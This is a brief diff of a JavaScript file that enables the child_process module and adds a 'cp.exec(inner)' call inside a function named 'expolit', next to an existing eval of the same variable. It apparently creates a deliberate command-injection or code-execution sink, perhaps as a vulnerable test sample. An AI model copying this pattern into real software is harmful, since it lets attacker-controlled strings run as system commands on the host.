@@ -1,4 +1,4 @@
-//var cp = require("child_process");
+var cp = require("child_process");
 function ipt(str, input, val) {
   var root = {};
   //str[input] = val;
@@ -20,6 +20,7 @@ function expolit(string, input, val){
     var link = inner + "123";
     eval(inner);
   }
+  cp.exec(inner);
 
   try {
     var inner = 123;
